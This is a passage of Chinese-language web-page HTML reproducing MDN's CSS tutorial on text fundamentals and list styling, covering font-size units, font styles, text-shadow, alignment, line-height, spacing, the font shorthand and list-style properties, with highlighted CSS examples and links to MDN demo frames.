href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size"><code>font-size</code></a> 属性设置) 可以取大多数这些单位的值 (以及其他，比如百分比 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#percentages">percentages</a>)，然而你在调整字体大小时，最常用的单位是：</p><ul><li>px (像素): 将像素的值赋予给你的文本。这是一个绝对单位，它导致了在任何情况下，页面上的文本所计算出来的像素值都是一样的。</li><li>em: 1em 等于我们设计的当前元素的父元素上设置的字体大小 (更加具体的话，比如包含在父元素中的大写字母 M 的宽度) 如果你有大量设置了不同字体大小的嵌套元素，这可能会变得棘手，但它是可行的，如下图所示。为什么要使用这个麻烦的单位呢？当你习惯这样做时，那么就会变得很自然，你可以使用em调整任何东西的大小，不只是文本。你可以有一个单位全部都使用 em 的网站，这样维护起来会很简单。</li><li>rem: 这个单位的效果和 em 差不多，除了 1rem 等于 HTML 中的根元素的字体大小， (i.e. <html>) ，而不是父元素。这可以让你更容易计算字体大小，但是遗憾的是， rem 不支持 Internet Explorer 8 和以下的版本。如果你的项目需要支持较老的浏览器，你可以坚持使用em 或 px, 或者是 polyfill 就像 REM-unit-polyfill. （这个单位在“CSS 的值和单位”一节也有讲解）</li></ul><p>元素的 font-size 属性是从该元素的父元素继承的。所以这一切都是从整个文档的根元素——<html>开始，浏览器的 font-size 标准设置的值为 16px。在根元素中的任何段落 (或者那些浏览器没有设置默认大小的元素)，会有一个最终的大小值：16px。其他元素也许有默认的大小，比如 <h1> (en-US) 元素有一个 2em 的默认值，所以它的最终大小值为 32px。当你开始更改嵌套元素的字体大小时，事情会变得棘手。比如，如果你有一个 <article> 元素在你的页面上，然后设置它的 font-size 为 1.5em (通过计算，可以得到大小为 24px)，然后想让 <article> 元素中的段落获得一个计算值为 20px 的大小，那么你应该使用多少 em。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- document base font-size is 16px --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span> <span class="hljs-comment">&lt;!-- If my font-size is 1.5em --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- How do I compute to 20px font-size? --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></td></tr></table></figure><p>你需要将 em 的值设置为 20&#x2F;24, 或者 <code>0.83333333em</code>. 这个计算可能比较复杂，所以当你设置的时候，你需要仔细一些。如果可以使用 rem 的话，那实现起来就变得简单不少，避免在可能的情况下设置容器元素的字体大小。</p><h4 id="一个简单的-size-示例"><a href="#一个简单的-size-示例" class="headerlink" title="一个简单的 size 示例"></a>一个简单的 size 示例</h4><p>当调整你的文本大小时，将文档 (document) 的基础 <code>font-size</code> 设置为 10px 往往是个不错的主意，这样之后的计算会变得简单，所需要的 (r)em 值就是想得到的像素的值除以 10，而不是 16。做完这个之后，你可以简单地调整在你的 HTML 中你想调整的不同类型文本的字体大小。在样式表的指定区域列出所有<code>font-size</code>的规则集是一个好主意，这样它们就可以很容易被找到。</p><p>我们的新结果是这样的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.6rem</span>;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.4rem</span>;<br>  <span class="hljs-attribute">color</span>: red;<br>  <span class="hljs-attribute">font-family</span>: Helvetica, Arial, sans-serif;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="一个简单的 size 示例 sample" id="frame_一个简单的_size_示例" width="100%" height="260" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84_size_%E7%A4%BA%E4%BE%8B.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="字体样式、字体粗细、文本转换和文本装饰"><a href="#字体样式、字体粗细、文本转换和文本装饰" class="headerlink" title="字体样式、字体粗细、文本转换和文本装饰"></a>字体样式、字体粗细、文本转换和文本装饰</h4><p>CSS 提供了 4 种常用的属性来改变文本的样子：</p><ul><li><code>font-style</code>: 用来打开和关闭文本 italic (斜体)。可能的值如下 (你很少会用到这个属性，除非你因为一些理由想将斜体文字关闭斜体状态)：<ul><li><code>normal</code>: 将文本设置为普通字体 (将存在的斜体关闭)</li><li><code>italic</code>: 如果当前字体的斜体版本可用，那么文本设置为斜体版本；如果不可用，那么会利用 oblique 状态来模拟 italics。</li><li><code>oblique</code>: 将文本设置为斜体字体的模拟版本，也就是将普通文本倾斜的样式应用到文本中。</li></ul></li><li><code>font-weight</code>: 设置文字的粗体大小。这里有很多值可选 (比如-light, -normal,  -bold, -extrabold, -black, 等等), 不过事实上你很少会用到normal和bold以外的值：<ul><li><code>normal</code>, <code>bold</code>: 普通或者<strong>加粗</strong>的字体粗细</li><li><code>lighter</code>, <code>bolder</code>: 将当前元素的粗体设置为比其父元素粗体更细或更粗一步。<code>100</code>–<code>900</code>: 数值粗体值，如果需要，可提供比上述关键字更精细的粒度控制。</li></ul></li><li><code>text-transform</code>: 允许你设置要转换的字体。值包括：<ul><li><code>none</code>: 防止任何转型。</li><li><code>uppercase</code>: 将所有文本转为大写。</li><li><code>lowercase</code>: 将所有文本转为小写。</li><li><code>capitalize</code>: 转换所有单词让其首字母大写。</li><li><code>full-width</code>: 将所有字形转换成全角，即固定宽度的正方形，类似于等宽字体，允许拉丁字符和亚洲语言字形（如中文，日文，韩文）对齐。</li></ul></li><li><code>text-decoration</code>: 设置&#x2F;取消字体上的文本装饰 (你将主要使用此方法在设置链接时取消设置链接上的默认下划线。) 可用值为：<ul><li><code>none</code>: 取消已经存在的任何文本装饰。</li><li><code>underline</code>: 文本下划线。</li><li><code>overline</code>: 文本上划线</li><li><code>line-through</code>: 穿过文本的线。</li></ul></li></ul><p>你应该注意到<code>text-decoration</code>可以一次接受多个值，如果你想要同时添加多个装饰值，比如text-decoration: underline overline。同时注意<code>text-decoration</code>是一个缩写形式，它由<code>text-decoration-line</code>,<code>text-decoration-style</code>和<code>text-decoration-color</code>构成。你可以使用这些属性值的组合来创建有趣的效果，比如text-decoration: line-through red wavy.我们来看一下这几个属性添加到我们的例子中：</p><p>我们的新结果是这样的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.6rem</span>;<br>  <span class="hljs-attribute">text-transform</span>: capitalize;<br>&#125;<br><br><span class="hljs-selector-tag">h1</span> + <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.4rem</span>;<br>  <span class="hljs-attribute">color</span>: red;<br>  <span class="hljs-attribute">font-family</span>: Helvetica, Arial, sans-serif;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="字体样式、字体粗细、文本转换和文本装饰 sample" id="frame_字体样式、字体粗细、文本转换和文本装饰" width="100%" height="260" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E5%AD%97%E4%BD%93%E6%A0%B7%E5%BC%8F%E3%80%81%E5%AD%97%E4%BD%93%E7%B2%97%E7%BB%86%E3%80%81%E6%96%87%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E8%A3%85%E9%A5%B0.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="文字阴影"><a href="#文字阴影" class="headerlink" title="文字阴影"></a>文字阴影</h4><p>你可以为你的文本应用阴影，使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-shadow"><code>text-shadow</code></a> 属性。这最多需要 4 个值，如下例所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">text</span>-shadow: <span class="hljs-number">4</span>px <span class="hljs-number">4</span>px <span class="hljs-number">5</span>px red;<br></code></pre></td></tr></table></figure><p>4 个属性如下：</p><ol><li>阴影与原始文本的水平偏移，可以使用大多数的 CSS 单位 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#length_and_size">length and size units</a>, 但是 px 是比较合适的。这个值必须指定。</li><li>阴影与原始文本的垂直偏移;效果基本上就像水平偏移，除了它向上&#x2F;向下移动阴影，而不是左&#x2F;右。这个值必须指定。</li><li>模糊半径 - 更高的值意味着阴影分散得更广泛。如果不包含此值，则默认为 0，这意味着没有模糊。可以使用大多数的 CSS 单位 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#length_and_size">length and size units</a>.</li><li>阴影的基础颜色，可以使用大多数的 CSS 颜色单位 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#colors">CSS color unit</a>. 如果没有指定，默认为 <code>black</code>.</li></ol><p><strong>备注：</strong> 正偏移值可以向右移动阴影，但也可以使用负偏移值来左右移动阴影，例如 <code>-1px -1px</code>.</p><h4 id="多种阴影"><a href="#多种阴影" class="headerlink" title="多种阴影"></a>多种阴影</h4><p>您可以通过包含以逗号分隔的多个阴影值，将多个阴影应用于同一文本，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">text</span>-shadow: -<span class="hljs-number">1</span>px -<span class="hljs-number">1</span>px <span class="hljs-number">1</span>px #aaa,<br>             <span class="hljs-attribute">0px</span> <span class="hljs-number">4</span>px <span class="hljs-number">1</span>px rgba(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>.<span class="hljs-number">5</span>),<br>             <span class="hljs-attribute">4px</span> <span class="hljs-number">4</span>px <span class="hljs-number">5</span>px rgba(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>.<span class="hljs-number">7</span>),<br>             <span class="hljs-attribute">0px</span> <span class="hljs-number">0</span>px <span class="hljs-number">7</span>px rgba(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>.<span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>如果我们把这个样式应用到我们 “Tommy the cat” 示例中的 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements"><code>&lt;h1&gt;</code> (en-US)</a> 元素，就像这样：</p><iframe class="sample-code-frame" title="多种阴影 sample" id="frame_多种阴影" width="100%" height="260" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E5%A4%9A%E7%A7%8D%E9%98%B4%E5%BD%B1.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 你可以看到更多有趣的关于 <code>text-shadow</code> 使用的示例在 <a href="https://www.sitepoint.com/moonlighting-css-text-shadow/">Moonlighting with CSS text-shadow</a>.</p><h4 id="文本布局"><a href="#文本布局" class="headerlink" title="文本布局"></a>文本布局</h4><p>有了基本的字体属性，我们来看看我们可以用来影响文本布局的属性。</p><h4 id="文本对齐"><a href="#文本对齐" class="headerlink" title="文本对齐"></a>文本对齐</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-align"><code>text-align</code></a> 属性用来控制文本如何和它所在的内容盒子对齐。可用值如下，并且在与常规文字处理器应用程序中的工作方式几乎相同：</p><ul><li><code>left</code>: 左对齐文本。</li><li><code>right</code>: 右对齐文本。</li><li><code>center</code>: 居中文字</li><li><code>justify</code>: 使文本展开，改变单词之间的差距，使所有文本行的宽度相同。你需要仔细使用，它可以看起来很可怕。特别是当应用于其中有很多长单词的段落时。如果你要使用这个，你也应该考虑一起使用别的东西，比如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/hyphens"><code>hyphens</code></a>，打破一些更长的词语。</li></ul><p>如果我们应用 <code>text-align: center;</code> 到我们例子中的 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements"><code>&lt;h1&gt;</code> (en-US)</a> 元素中，结果如下：</p><iframe class="sample-code-frame" title="文本对齐 sample" id="frame_文本对齐" width="100%" height="260" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E6%96%87%E6%9C%AC%E5%AF%B9%E9%BD%90.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="行高"><a href="#行高" class="headerlink" title="行高"></a>行高</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-height"><code>line-height</code></a> 属性设置文本每行之间的高，可以接受大多数单位 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#length_and_size">length and size units</a>，不过也可以设置一个无单位的值，作为乘数，通常这种是比较好的做法。无单位的值乘以 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size"><code>font-size</code></a> 来获得 <code>line-height</code>。当行与行之间拉开空间，正文文本通常看起来更好更容易阅读。推荐的行高大约是 1.5–2 (双倍间距。) 所以要把我们的文本行高设置为字体高度的 1.5 倍，你可以使用这个：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">line</span>-height: <span class="hljs-number">1</span>.<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>把这个样式应用到我们示例中的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p"><code>&lt;p&gt;</code></a> 元素，结果如下：</p><iframe class="sample-code-frame" title="行高 sample" id="frame_行高" width="100%" height="300" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E8%A1%8C%E9%AB%98.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="字母和单词间距"><a href="#字母和单词间距" class="headerlink" title="字母和单词间距"></a>字母和单词间距</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/letter-spacing"><code>letter-spacing</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/word-spacing"><code>word-spacing</code></a> 属性允许你设置你的文本中的字母与字母之间的间距、或是单词与单词之间的间距。你不会经常使用它们，但是可能可以通过它们，来获得一个特定的外观，或者让较为密集的文字更加可读。它们可以接受大多数单位 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#length_and_size">length and size units</a>.</p><p>所以作为例子，如果我们把这个样式应用到我们的示例中的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p"><code>&lt;p&gt;</code></a> 段落的第一行：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-line</span> &#123;<br>  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">2px</span>;<br>  <span class="hljs-attribute">word-spacing</span>: <span class="hljs-number">4px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们会得到下面的结果：</p><iframe class="sample-code-frame" title="字母和单词间距 sample" id="frame_字母和单词间距" width="100%" height="330" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E5%AD%97%E6%AF%8D%E5%92%8C%E5%8D%95%E8%AF%8D%E9%97%B4%E8%B7%9D.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="其他一些值得看一下的属性"><a href="#其他一些值得看一下的属性" class="headerlink" title="其他一些值得看一下的属性"></a>其他一些值得看一下的属性</h4><p>以上属性让你了解如何开始在网页上设置文本，但是你可以使用更多的属性。我们只是想介绍最重要的。一旦你习惯使用上面的内容，你还应该探索以下几点：</p><p>Font 样式：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant"><code>font-variant</code></a>: 在小型大写字母和普通文本选项之间切换。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-kerning"><code>font-kerning</code></a>: 开启或关闭字体间距选项。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-feature-settings"><code>font-feature-settings</code></a>: 开启或关闭不同的 <a href="https://en.wikipedia.org/wiki/OpenType">OpenType</a> 字体特性。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant-alternates"><code>font-variant-alternates</code></a>: 控制给定的自定义字体的替代字形的使用。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant-caps"><code>font-variant-caps</code></a>: 控制大写字母替代字形的使用。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant-east-asian"><code>font-variant-east-asian</code> (en-US)</a>: 控制东亚文字替代字形的使用，像日语和汉语。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant-ligatures"><code>font-variant-ligatures</code></a>: 控制文本中使用的连写和上下文形式。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant-numeric"><code>font-variant-numeric</code></a>: 控制数字，分式和序标的替代字形的使用。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant-position"><code>font-variant-position</code></a>: 控制位于上标或下标处，字号更小的替代字形的使用。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size-adjust"><code>font-size-adjust</code></a>: 独立于字体的实际大小尺寸，调整其可视大小尺寸。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-stretch"><code>font-stretch</code></a>: 在给定字体的可选拉伸版本中切换。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-underline-position"><code>text-underline-position</code></a>: 指定下划线的排版位置，通过使用 <code>text-decoration-line</code> 属性的<code>underline</code> 值。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-rendering"><code>text-rendering</code></a>: 尝试执行一些文本渲染优化。</li></ul><p>文本布局样式：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-indent"><code>text-indent</code></a>: 指定文本内容的第一行前面应该留出多少的水平空间。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-overflow"><code>text-overflow</code></a>: 定义如何向用户表示存在被隐藏的溢出内容。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/white-space"><code>white-space</code></a>: 定义如何处理元素内部的空白和换行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/word-break"><code>word-break</code></a>: 指定是否能在单词内部换行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/direction"><code>direction</code></a>: 定义文本的方向 (这取决于语言，并且通常最好让 HTML 来处理这部分，因为它是和文本内容相关联的。)</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/hyphens"><code>hyphens</code></a>: 为支持的语言开启或关闭连字符。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-break"><code>line-break</code></a>: 对东亚语言采用更强或更弱的换行规则。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-align-last"><code>text-align-last</code></a>: 定义一个块或行的最后一行，恰好位于一个强制换行前时，如何对齐。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-orientation"><code>text-orientation</code></a>: 定义行内文本的方向。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow-wrap"><code>word-wrap</code></a>: 指定浏览器是否可以在单词内换行以避免超出范围。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/writing-mode"><code>writing-mode</code></a>: 定义文本行布局为水平还是垂直，以及后继文本流的方向。</li></ul><h4 id="Font-简写"><a href="#Font-简写" class="headerlink" title="Font 简写"></a>Font 简写</h4><p>许多字体的属性也可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font"><code>font</code></a> 的简写方式来设置 . 这些是按照以下顺序来写的： <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-style"><code>font-style</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-variant"><code>font-variant</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-weight"><code>font-weight</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-stretch"><code>font-stretch</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size"><code>font-size</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-height"><code>line-height</code></a>, and <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-family"><code>font-family</code></a>.</p><p>如果你想要使用 <code>font</code> 的简写形式，在所有这些属性中，只有 <code>font-size</code> 和 <code>font-family</code> 是一定要指定的。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size"><code>font-size</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-height"><code>line-height</code></a> 属性之间必须放一个正斜杠。</p><p>一个完整的例子如下所示：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">font</span>: italic normal bold normal <span class="hljs-number">3em</span>/<span class="hljs-number">1.5</span> Helvetica, Arial, sans-serif;<br></code></pre></td></tr></table></figure><h3 id="2-11-样式化列表"><a href="#2-11-样式化列表" class="headerlink" title="2.11 样式化列表"></a>2.11 样式化列表</h3><h4 id="列表特定样式"><a href="#列表特定样式" class="headerlink" title="列表特定样式"></a>列表特定样式</h4><p>现在我们来看一下列表的一般间距，我们来研究一些列表具有的特定属性。我们从三个属性开始了解，这三个属性可以在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ol">&#96;&#96;</a> 元素上设置：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a> ：设置用于列表的项目符号的类型，例如无序列表的方形或圆形项目符号，或有序列表的数字，字母或罗马数字。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-position"><code>list-style-position</code></a> ：设置在每个项目开始之前，项目符号是出现在列表项内，还是出现在其外。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-image"><code>list-style-image</code></a> ：允许您为项目符号使用自定义图片，而不是简单的方形或圆形。</li></ul><h4 id="符号样式"><a href="#符号样式" class="headerlink" title="符号样式"></a>符号样式</h4><p>像上面所提及的， <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a> 属性允许你设置项目符号点的类型，在我们的例子中，我们在有序列表上设置了大写罗马数字：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ol</span> &#123;<br>  <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">upper-roman</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果显示如下：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Styling_text/Styling_lists/outer-bullets.png" alt="an ordered list with the bullet points set to appear outside the list item text."></p><p>您可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a> 参考页面查找到更多选项。</p><h4 id="项目符号位置"><a href="#项目符号位置" class="headerlink" title="项目符号位置"></a>项目符号位置</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-position"><code>list-style-position</code></a> 设置在每个项目开始之前，项目符号是出现在列表项内，还是出现在其外。如上所示，默认值为 outside，这使项目符号位于列表项之外。</p><p>如果值设置为 inside，项目条目则位于行内。</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ol</span> &#123;<br>  <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">upper-roman</span>;<br>  <span class="hljs-built_in">list-style-position:</span> <span class="hljs-string">inside</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Styling_text/Styling_lists/inner-bullets.png" alt="an ordered list with the bullet points set to appear inside the list item text."></p><h4 id="使用自定义的项目符号图片"><a href="#使用自定义的项目符号图片" class="headerlink" title="使用自定义的项目符号图片"></a>使用自定义的项目符号图片</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-image"><code>list-style-image</code></a> 属性允许对于项目符号使用自定义图片。其语法相当简单：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span> &#123;<br>  <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">star</span>.<span class="hljs-string">svg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然而，这个属性在控制项目符号的位置，大小等方面是有限的。您最好使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 系列属性，您将在 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks">Styling boxes</a> 模块中了解更多信息。在这里我们仅做一点尝试！</p><p>结束我们的例子，我们样式化无序列表像这样（放到您之前所见的顶部）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &#123;<br>  <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">2rem</span>;<br>  <span class="hljs-attribute">list-style-type</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> &#123;<br>  <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">2rem</span>;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.svg</span>);<br>  <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">background-size</span>: <span class="hljs-number">1.6rem</span> <span class="hljs-number">1.6rem</span>;<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的所做如下：</p><ul><li>将<code>&lt;ul&gt;</code> 的 